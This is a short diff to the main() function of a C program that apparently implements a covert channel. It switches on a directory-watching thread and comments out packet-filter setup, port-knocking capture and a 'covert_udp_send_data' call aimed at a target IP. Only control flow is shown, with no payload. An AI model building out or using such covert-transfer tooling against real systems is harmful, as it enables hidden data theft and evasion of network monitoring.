@@ -90,14 +90,14 @@ int main(int argc, char **argv){
                 exit(1);
         }
     }
-    /*(inotify_struct *inotify_args = malloc(sizeof(*inotify_args));
+    inotify_struct *inotify_args = malloc(sizeof(*inotify_args));
     strncpy(inotify_args->file, file, BUFSIZ);
     strncpy(inotify_args->targetip, targetip, BUFSIZ);
     strncpy(inotify_args->localip, localip, BUFSIZ);
     strncpy(inotify_args->directory, directory, BUFSIZ);
     inotify_args->tcp = tcp;
-    pthread_create(&inotify_thread, NULL, watch_directory,inotify_args);*/
-    Filter = InitFilter(targetip,localip,false);
+    pthread_create(&inotify_thread, NULL, recv_watch_directory,inotify_args);
+    /*Filter = InitFilter(targetip,localip,false);
     PrintFilter(Filter);
     CreateFilter(Filter, pcapfilter);
     printf("Filter: %s\n",pcapfilter);
@@ -107,7 +107,7 @@ int main(int argc, char **argv){
         covert_udp_send_data(Filter.localip, Filter.targetip, UPORT, UPORT, data, 1);
     }
 	//wait for port knocking
-	Packetcapture(pcapfilter,Filter,tcp);
-	//pthread_join(inotify_thread, NULL);
+	Packetcapture(pcapfilter,Filter,tcp);*/
+	pthread_join(inotify_thread, NULL);
     return 0;
 }
